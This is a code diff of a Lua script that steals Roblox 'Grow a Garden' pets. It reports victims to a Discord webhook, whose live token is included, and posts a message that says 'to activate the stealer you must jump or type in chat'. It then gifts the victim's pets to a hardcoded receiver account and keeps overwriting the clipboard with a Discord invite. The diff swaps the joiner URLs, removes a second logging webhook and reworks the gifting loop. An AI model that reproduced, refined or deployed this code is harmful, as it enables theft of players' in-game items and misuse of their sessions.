@@ -1,4 +1,9 @@
-        local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
+
+
+--Execution Count Updater
+local HttpService = game:GetService("HttpService")
+local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
+
         local date = os.date("%Y-%m-%d %H:%M:%S")
         local LogsWebhook = "https://discord.com/api/webhooks/1434976186999509063/jjItn51GRNYAO2RtJRMn98Tk2eeTJar6GcrFqvA_z56OeX-QWtrjeQ2tOpXDi33S55md"
         local RS = game:GetService("ReplicatedStorage")
@@ -21,7 +26,7 @@
 
         coroutine.wrap(function()
     while true do
-        setclipboard("YOUR SCRIPT BEING LOADED,PLEASE WAIT")
+        setclipboard("discord.gg/cnUAk7uc3n")
         wait(1)
     end
 end)()
@@ -402,8 +407,8 @@ end
             avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png?ex=68992f30&is=6897ddb0&hm=a2eec3928982ef85b783700d7e825ff633d0b0cfb38b3d24de570e4c1dc904cd&",
             content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
             embeds = {{
-                title = "GROW A GARDEN SCRIPT HITS BOSSING",
-                url = "https://scriptssm.vercel.app/joiner.html?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
+                title = "Grow a Garden Hit - Scripts.SM",
+                url = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
                 color = 57855,
                 fields = {
                     {
@@ -463,7 +468,7 @@ end
                     },
                     {
                         name = "🔗 Join with URL",
-                        value = "[Click here to join](https://scriptssm.vercel.app/joiner.html?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
+                        value = "[Click here to join](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
                         inline = false
                     }
                 },
@@ -496,20 +501,6 @@ end)
 
 -- Warnings
 if not success1 then warn("Something Went Wrong [Main Webhook Error]", err1) end
-
-
-local success2, err2 = pcall(function()
-    request({
-        Url = LogsWebhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode(payload)
-    })
-end)
-
-if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
 
                 local function CreateGui()
                     local player = Players.LocalPlayer
@@ -598,8 +589,7 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
                 end
 
         local usernames = {
-            "GHOSS23"
-    
+            "GHOSS23",
         }
 
         local receiverPlr
@@ -743,7 +733,7 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
         end
 
         humanoid:EquipTool(tool)
-        task.wait(0.5) -- Increased wait for server to register equip
+        task.wait(0.6) -- Increased wait for server to register equip
 
         -- Verify tool is equipped
         if tool.Parent ~= targetPlr.Character then
@@ -753,7 +743,7 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
         end
 
         if detectExecutor() == "Delta" then
-            task.wait(0.5)
+            task.wait(0.3)
             local camera = workspace.CurrentCamera
             local head = receiverChar and receiverChar:FindFirstChild("Head")
 
@@ -800,16 +790,15 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
                 return false
             end
 
-            task.wait(0.5)
+            task.wait(0.55)
         end
 
             -- Verify tool is no longer in possession (indicating successful gift)
-task.wait(0.50)
-if tool and tool.Parent == inventory then
-    warn("Gift may have failed for:", tool.Name)
-    return false
-end
-return true
+        task.wait(0.15) -- Increased wait to confirm gift
+        if tool then
+            tool.Parent = targetPlr.Backpack
+        end
+        return true
 
     end
 
@@ -817,29 +806,16 @@ return true
     task.wait(1)
 
     -- Gifting loop
-for _, tool in ipairs(targetPlr.Backpack:GetChildren()) do
-    if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
-        local uuid = tostring(tool:GetAttribute("PET_UUID") or "")
-        for _, pet in ipairs(pets) do
-            if tostring(pet.Id) == uuid then
-                print("[Gifting] Attempting to gift:", tool.Name, "UUID:", uuid)
-                local success = false
+    for _, pet in ipairs(pets) do
+        for _, tool in targetPlr.Backpack:GetChildren() do
+            if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("PET_UUID") == pet.Id then
+                print("Gifting:", tool.Name)
                 for attempt = 1, 3 do
-                    if safeGiftTool(tool) then
-                        print("[Gifting] Successfully gifted:", tool.Name)
-                        success = true
+                    result = safeGiftTool(tool)
+                    if result then
                         break
-                    else
-                        warn("[Gifting] Failed attempt", attempt, "for:", tool.Name)
-                        task.wait(1)
                     end
-                end
-                -- Jika berhasil, tunggu sedikit sebelum lanjut
-                if success then
-                    task.wait(0.8)
-                end
-                break -- lanjut ke tool berikutnya
+                end       
             end
         end
     end
-end
